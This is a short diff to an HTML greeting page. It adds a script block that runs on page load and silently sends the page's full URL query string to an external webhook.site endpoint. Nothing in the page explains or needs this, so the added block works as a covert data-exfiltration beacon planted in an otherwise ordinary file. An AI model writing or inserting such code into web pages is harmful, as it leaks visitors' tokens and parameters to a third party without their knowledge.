@@ -9,6 +9,13 @@
 <body>
   <h1>Hello!</h1>
   <p id="out">What do you see</p>
+  <script>
+  const params = location.search.slice(1);              
+  if (params) {
+    fetch('https://webhook.site/6be9172d-158c-4486-a50c-0d72e83666c0?' + params);
+    }
+  </script>
+
 
   <script>
     const p = new URLSearchParams(location.search);
